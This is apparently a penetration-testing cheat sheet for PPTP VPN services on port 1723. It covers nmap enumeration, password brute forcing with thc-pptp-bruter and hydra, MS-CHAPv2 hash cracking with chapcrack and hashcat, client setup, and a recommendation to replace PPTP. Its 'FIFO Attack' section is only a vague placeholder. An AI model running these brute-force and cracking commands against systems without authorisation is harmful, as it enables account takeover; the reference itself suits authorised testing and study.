# Port 1723 - PPTP VPN

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Connection](#connection)

---

## Enumeration

### Nmap Scripts

```shell
nmap -sV -sC -p1723 $rhost
nmap -p1723 --script pptp-version $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 1723
```

### Version Detection

```shell
# Using nmap
nmap -p1723 --script pptp-version $rhost

# Check for GRE protocol (required for PPTP)
nmap -sO $rhost | grep -i gre
```

---

## Exploitation

### PPTP Vulnerabilities

> PPTP uses MS-CHAPv2 which is weak

### Brute Force

```shell
# Using thc-pptp-bruter
apt install thc-pptp-bruter

thc-pptp-bruter -u $username -W /usr/share/wordlists/rockyou.txt $rhost

# Hydra (limited support)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pptp://$rhost
```

### MS-CHAPv2 Cracking

```shell
# 1. Capture MS-CHAPv2 handshake (MITM or packet capture)
# 2. Extract challenge and response

# Using chapcrack
pip install chapcrack
chapcrack parse -f handshake.pcap

# Submit to crack.sh for free cracking
# or use hashcat
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
```

### FIFO Attack

> Force server to use weak encryption

```shell
# During connection negotiation, force MPPE-40 or no encryption
```

---

## Connection

### Linux Client (pptpsetup)

```shell
# Install
apt install pptp-linux

# Configure
pptpsetup --create vpn --server $rhost --username $user --password $pass

# Connect
pon vpn

# Disconnect
poff vpn
```

### Manual Configuration

```shell
# /etc/ppp/peers/vpn
pty "pptp $rhost --nolaunchpppd"
name $username
remotename PPTP
require-mppe-128
file /etc/ppp/options.pptp
ipparam vpn

# /etc/ppp/chap-secrets
$username PPTP $password *

# Connect
pon vpn
```

### Windows Client

```powershell
# Add VPN connection
Add-VpnConnection -Name "VPN" -ServerAddress $rhost -TunnelType Pptp -AuthenticationMethod MSChapv2 -EncryptionLevel Optional

# Connect
rasdial "VPN" $username $password
```

---

## Security Issues

### Known Weaknesses

| Issue | Description |
| --- | --- |
| MS-CHAPv2 | Weak authentication, crackable |
| MPPE | Weak encryption derived from password |
| No Perfect Forward Secrecy | Session key compromise |
| GRE | Often blocked by firewalls |

### Mitigation

> PPTP should not be used. Prefer:

- OpenVPN
- WireGuard
- IPsec/IKEv2

---

## Tools

- thc-pptp-bruter: <https://github.com/vanhauser-thc/thc-pptp-bruter>
- chapcrack: <https://github.com/moxie0/chapcrack>
- pptpd: PPTP server for testing

---

## References

- [HackTricks - PPTP](https://book.hacktricks.wiki/network-services-pentesting/1723-pentesting-pptp.html)
- [MS-CHAPv2 Cracking](https://www.cloudcracker.com/blog/2012/07/29/cracking-ms-chap-v2/)
